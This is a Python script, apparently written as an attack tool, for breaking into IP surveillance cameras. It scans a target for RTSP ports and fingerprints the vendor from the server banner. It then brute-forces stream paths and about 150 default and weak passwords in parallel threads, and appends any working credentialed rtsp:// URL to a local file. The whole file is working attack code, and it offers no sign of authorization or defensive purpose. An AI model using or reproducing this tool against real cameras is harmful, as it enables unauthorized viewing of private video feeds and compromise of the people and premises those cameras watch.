#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
from tqdm import tqdm
import socket
import re
import base64
import os
import concurrent.futures
import threading

class CamLib():

    def Hikvision(self):
        paths = [
            'Streaming/Channels/101', 
            'Streaming/Channels/102',  
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin', 'root', 'supervisor']
        return (users, paths)

    def Dahua(self):
        paths = [
            'cam/realmonitor?channel=1&subtype=0',   
            'cam/realmonitor?channel=1&subtype=1',   
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['root', 'system']
        return (users, paths)

    def Uniview(self):
        paths = [
            'ucast/1/1',
            'stream1',
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin']
        return (users, paths)

    def Axis(self):
        paths = [
            'axis-media/media.amp',
            'axis-cgi/mjpg/video.cgi',
            'axis-cgi/media.cgi',
            'live.sdp',
        ]
        users = ['root', 'admin']
        return (users, paths)

    def Sony(self):
        paths = [
            'SNC/media/media.amp',
            'live.sdp',
            'videoMain',
        ]
        users = ['admin']
        return (users, paths)

    def Vivotek(self):
        paths = [
            'live.sdp',
            'live',
            'videoMain',
            'videoSub',
        ]
        users = ['admin']
        return (users, paths)

    def TVT(self):
        paths = [
    'cam/realmonitor?channel=1&subtype=0',
    'live.sdp',
    'videoMain',
    'media/video1',
    'media/video2',
    'stream1',
    'stream2',
    'h264',
    'h265',
    'videoSub',
    'ch0_0.h264',
    'ch1_0.h264',
    'user=admin_password=123456_channel=1_stream=0.sdp',
    'live/ch00_0',
    '0',
    '1',
    '11',
    '12',
    'h264Preview_01_main',
    'h264Preview_01_sub',
    ]
        users = ['admin']
        return (users, paths)

    def Reolink(self):
        paths = [
            'h264Preview_01_main',
            'h264Preview_01_sub',
            'live.sdp',
        ]
        users = ['admin']
        return (users, paths)

    def Milesight(self):
        paths = [
            'Streaming/Channels/101',
            'Streaming/Channels/102',
            'live.sdp',
            'videoMain',
            'media/video1',
        ]
        users = ['admin']
        return (users, paths)

class Execute_Cam(CamLib):
    def __init__(self):
        self.__PASSWORD = [
        # Most common passwords
        '123456',
        'admin',
        'password',
        '12345',
        '1234',
        '12345678',
        '123456789',
        '1234567890',
        '111111',
        '123123',
        '1234567',
        'qwerty',
        'abc123',
        'password1',
        'root',
        'admin123',
        'admin1234',
        '123321',
        '888888',
        'adminadmin',
        '123',
        'user',
        '123qwe',
        'pass',
        '123abc',
        'admin1',
        'pass123',
        '123abc123',
        '1234qwer',
        'default',
        'guest',
        '123456a',
        '123abc!',
        '11111111',
        # Common camera defaults
        '',
        '000000',
        '666666',
        '88888888',
        '123456789a',
        'admin888',
        'admin123456',
        '12345678910',
        'a123456',
        '123456789abc',
        'admin000',
        'root123',
        'root123456',
        '12345678a',
        'admin123!',
        'admin@123',
        'admin#123',
        '123456789!',
        'password123',
        'password1234',
        'password12345',
        'password123456',
        # Common weak passwords
        'qwerty123',
        'qwerty1234',
        'qwerty12345',
        'qwertyuiop',
        'asdfgh',
        'asdfgh123',
        'zxcvbn',
        'zxcvbn123',
        '1qaz2wsx',
        '1q2w3e4r',
        '1q2w3e',
        'qwe123',
        'qweasd',
        'qweasd123',
        'qwertyui',
        '123qweasd',
        'qaz123',
        'wsx123',
        'edc123',
        # Common patterns
        'admin123!@#',
        'admin@123456',
        'Admin123',
        'ADMIN123',
        'Admin123456',
        'administrator',
        'Administrator',
        'ADMINISTRATOR',
        '123456admin',
        'admin123456789',
        'root123456',
        'root123456789',
        'roottoor',
        'toor',
        'passw0rd',
        'Passw0rd',
        'PASSWORD',
        'Password',
        # Common numeric patterns
        '00000000',
        '1111111111',
        '123456789012',
        '987654321',
        '9876543210',
        '12344321',
        '112233',
        '11223344',
        '121212',
        '123123123',
        '12341234',
        '1234512345',
        # Common words
        'camera',
        'Camera',
        'CAMERA',
        'security',
        'Security',
        'SECURITY',
        'surveillance',
        'Surveillance',
        'ipcam',
        'IPCam',
        'IPCAM',
        'dvr',
        'DVR',
        'nvr',
        'NVR',
        'system',
        'System',
        'SYSTEM',
        # Empty and null
        'null',
        'NULL',
        'none',
        'None',
        'NONE',
        ]
        # Common RTSP ports to scan
        self.__COMMON_RTSP_PORTS = [
            554,    # Default RTSP port
            8554,   # Common alternative
            5544,   # Alternative
            5554,   # Alternative
            1935,   # RTMP/RTSP hybrid
            8080,   # HTTP/RTSP hybrid
            8888,   # Alternative
            1554,   # Alternative
            10554,  # Alternative
            8555,   # Alternative
            8556,   # Alternative
            8557,   # Alternative
            8558,   # Alternative
        ]
        # Default port range for full scan (1-10000 is reasonable)
        self.__DEFAULT_PORT_RANGE = (1, 10000)

    def scan_all_ports(self, ip: str, port_range=None):
        """Scan all ports in range to find open ports, then check which are RTSP"""
        if port_range is None:
            port_range = self.__DEFAULT_PORT_RANGE
        
        start_port, end_port = port_range
        total_ports = end_port - start_port + 1
        
        print(f"[*] Scanning {total_ports} ports ({start_port}-{end_port}) on {ip} to find open ports...")
        open_ports = []
        
        def check_port_open(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)  # Fast timeout for initial scan
                result = sock.connect_ex((ip, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        # First pass: Find all open ports
        print("[*] Phase 1: Finding open ports...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(check_port_open, port): port for port in range(start_port, end_port + 1)}
            for future in tqdm(concurrent.futures.as_completed(futures), total=total_ports, desc="Scanning ports", unit="port"):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        open_ports = sorted(open_ports)
        
        if not open_ports:
            print("[!] No open ports found")
            return []
        
        print(f"[+] Found {len(open_ports)} open port(s): {', '.join(map(str, open_ports))}")
        
        # Second pass: Check which open ports are RTSP
        print(f"\n[*] Phase 2: Checking which of {len(open_ports)} open port(s) are RTSP services...")
        rtsp_ports = []
        
        def check_rtsp(port):
            if self.__is_rtsp_port(ip, port):
                return port
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_rtsp, port): port for port in open_ports}
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(open_ports), desc="Checking RTSP", unit="port"):
                result = future.result()
                if result:
                    rtsp_ports.append(result)
        
        if rtsp_ports:
            print(f"[+] Found RTSP service on {len(rtsp_ports)} port(s): {', '.join(map(str, sorted(rtsp_ports)))}")
        else:
            print("[!] No RTSP service found on open ports")
        
        return sorted(rtsp_ports)

    def scan_rtsp_ports(self, ip: str):
        """Scan common RTSP ports and return list of ports with RTSP service"""
        print(f"[*] Scanning {len(self.__COMMON_RTSP_PORTS)} common RTSP ports on {ip}...")
        found_ports = []
        
        def check_port(port):
            try:
                # First check if port is open
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    # Port is open, check if it's RTSP
                    if self.__is_rtsp_port(ip, port):
                        return port
            except:
                pass
            return None
        
        # Use threading for faster port scanning with progress bar
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, port): port for port in self.__COMMON_RTSP_PORTS}
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(self.__COMMON_RTSP_PORTS), desc="Scanning ports", unit="port"):
                result = future.result()
                if result:
                    found_ports.append(result)
        
        if found_ports:
            print(f"[+] Found RTSP service on ports: {', '.join(map(str, sorted(found_ports)))}")
        else:
            print("[!] No RTSP service found on common ports")
        
        return sorted(found_ports)

    def __is_rtsp_port(self, ip: str, port: int):
        """Quick check if a port responds to RTSP requests"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            request = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(1024).decode(errors='ignore')
            sock.close()
            # Check if response looks like RTSP
            if "RTSP" in response or "401" in response or "200" in response:
                return True
        except:
            pass
        return False

    def run(self, ip: str, port=None, full_scan=False, port_range=None, max_workers=50):
        # If no port specified, scan for RTSP ports
        if port is None:
            if full_scan:
                # Full port scan: find all open ports, then check for RTSP
                found_ports = self.scan_all_ports(ip, port_range)
            else:
                # Quick scan: only check common RTSP ports
                found_ports = self.scan_rtsp_ports(ip)
            
            if not found_ports:
                print(f"[!] No RTSP ports found on {ip}")
                return
            
            # Try each found port
            for found_port in found_ports:
                print(f"\n{'='*60}")
                print(f"[+] Testing port {found_port}...")
                print(f"{'='*60}")
                self._run_on_port(ip, found_port, max_workers=max_workers)
        else:
            self._run_on_port(ip, port, max_workers=max_workers)

    def _run_on_port(self, ip: str, port: int, max_workers=50):
        """Internal method to run brute force on a specific IP:port"""
        print(f"[+] Testing target: {ip}:{port}")
        _, banner = self.__get_rtsp_banner(ip, port)
        if banner is None:
            print("[!] Could not get RTSP banner, but continuing with brute force anyway...")
        else:
            print(f"[*] RTSP Banner: {banner}")
        
        default_paths = [
            '',  # Empty path - very common
            '/',  # Root path
            'live.sdp',
            'stream1',
            'stream2',
            'h264',
            'h265',
            'videoMain',
            'videoSub',
            'media/video1',
            'media/video2',
            'ch0_0.h264',
            'ch1_0.h264',
            'user=admin_password=123456_channel=1_stream=0.sdp',
            'live/ch00_0',
            '0',
            '1',
            '11',
            '12',
            'h264Preview_01_main',
            'h264Preview_01_sub',
            'Streaming/Channels/101',
            'Streaming/Channels/102',
            'cam/realmonitor?channel=1&subtype=0',
            'cam/realmonitor?channel=1&subtype=1',
            # Additional common paths
            'live',
            'main',
            'sub',
            'video',
            'stream',
            'rtsp',
            'rtsp/stream',
            'live/main',
            'live/sub',
            'live/stream',
            'live/stream1',
            'live/stream2',
            'ipcam',
            'camera',
            'cam',
        ]
        users = [
            'admin',
            'root',
            'user',
            'guest',
            'administrator',
            'operator',
            'service',
            'support',
            'test',
            'demo',
            'camera',
            'ipcam',
            'dvr',
            'nvr',
            'system',
            'security',
            'surveillance',
            'supervisor',
            'manager',
            'tech',
            'default',
            'public',
            'private',
            'viewer',
            'view',
            'monitor',
            'live',
            'stream',
        ]
        
        if banner:
            banner_lower = banner.lower()
            if 'hikvision' in banner_lower:
                print("[+] Hikvision detected")
                users, default_paths = self.Hikvision()
            elif 'dahua' in banner_lower:
                print("[+] Dahua detected")
                users, default_paths = self.Dahua()
            elif 'uniview' in banner_lower:
                print("[+] Uniview detected")
                users, default_paths = self.Uniview()
            elif 'axis' in banner_lower:
                print("[+] Axis detected")
                users, default_paths = self.Axis()
            elif 'sony' in banner_lower:
                print("[+] Sony detected")
                users, default_paths = self.Sony()
            elif 'vivotek' in banner_lower:
                print("[+] Vivotek detected")
                users, default_paths = self.Vivotek()
            elif 'reolink' in banner_lower:
                print("[+] Reolink detected")
                users, default_paths = self.Reolink()
            elif 'tvt' in banner_lower:
                print("[+] TVT detected")
                users, default_paths = self.TVT()
            elif 'milesight' in banner_lower:
                print("[+] Milesight detected")
                users, default_paths = self.Milesight()
            else:
                print("[+] Unknown or clone device detected, using default paths")
        else:
            print("[+] No banner detected, using default paths and credentials")
        
        # Use configurable threads for faster brute forcing
        self.__rtsp_path_bruteforce(ip, port, default_paths, users, max_workers=max_workers)


    def __get_rtsp_banner(self, ip: str, port=554):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                "CSeq: 1\r\n"
                "\r\n"
            )
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            
            # Check if we got a valid RTSP response
            if "RTSP" in response or "401" in response or "200" in response:
                print("[*] RTSP service detected, preparing to brute-force.")
                match = re.search(r"Server:\s*(.+)", response, re.IGNORECASE)
                if match:
                    server = match.group(1).strip()
                else:
                    server = 'N/A'
                return (ip, server)
            else:
                return (ip, None)
        
        except socket.timeout:
            print(f"[!] Connection timeout to {ip}:{port}")
            return (ip, None)
        except socket.error as e:
            print(f"[!] Socket error: {e}")
            return (ip, None)
        except Exception as e:
            print(f"[!] Error getting banner: {e}")
            return (ip, None)


    def __rtsp_path_bruteforce(self, ip, port, paths, usernames, max_workers=50):
        # First, try without authentication (some cameras allow anonymous access)
        print("[*] Trying paths without authentication first...")
        for path in paths:
            if self.__try_rtsp_path(ip, port, path, None, None):
                return True
        
        # Then try with credentials
        combos = [
            (username, password, path)
            for username in usernames
            for password in self.__PASSWORD
            for path in paths
        ]

        print(f"[*] Trying {len(combos)} credential combinations with {max_workers} parallel threads...")
        
        # Use threading for parallel brute forcing
        found = {'result': False}
        lock = threading.Lock()
        
        def try_combo(combo):
            username, password, path = combo
            if found['result']:
                return False
            result = self.__try_rtsp_path(ip, port, path, username, password)
            if result:
                with lock:
                    found['result'] = True
                return True
            return False
        
        # Use ThreadPoolExecutor for parallel execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(try_combo, combo): combo for combo in combos}
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(combos), desc="Brute forcing", unit="combo"):
                try:
                    if future.result():
                        # Found valid credentials, cancel remaining tasks
                        for f in futures:
                            f.cancel()
                        break
                except:
                    pass
        
        if not found['result']:
            print("\n[!] No valid credentials/paths found")
        return found['result']

    def __try_rtsp_path(self, ip, port, path, username, password):
        # Handle empty path correctly
        if path == '' or path == '/':
            rtsp_path = f"rtsp://{ip}:{port}/"
        else:
            rtsp_path = f"rtsp://{ip}:{port}/{path}"
        
        # Build request
        if username and password:
            auth_str = f"{username}:{password}"
            b64_auth = base64.b64encode(auth_str.encode()).decode()
            request = (
                f"DESCRIBE {rtsp_path} RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"Authorization: Basic {b64_auth}\r\n"
                f"Accept: application/sdp\r\n"
                f"\r\n"
            )
        else:
            # Try without authentication
            request = (
                f"DESCRIBE {rtsp_path} RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"Accept: application/sdp\r\n"
                f"\r\n"
            )
        
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)  # Reduced timeout for faster scanning
            # Set socket options for faster connection
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((ip, port))
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            
            # Check for success (200 OK) or valid SDP content
            if "200 OK" in response or "Content-Type: application/sdp" in response or "v=0" in response:
                # Normalize the path for the final URL
                if path == '' or path == '/':
                    final_path = ''
                else:
                    final_path = '/' + path
                
                if username and password:
                    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}{final_path}"
                else:
                    rtsp_url = f"rtsp://{ip}:{port}{final_path}"
                
                print("\n[+] SUCCESS! Found valid RTSP URL")
                print(f"[!] RTSP URL: {rtsp_url}")
                os.makedirs('./data', exist_ok=True)
                with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
                    f.write(rtsp_url + '\n')
                if sock:
                    sock.close()
                return True

        except socket.timeout:
            # Timeout is normal, just continue
            pass
        except socket.error:
            # Connection errors are normal, just continue
            pass
        except Exception as e:
            # Other errors, log but continue
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        return False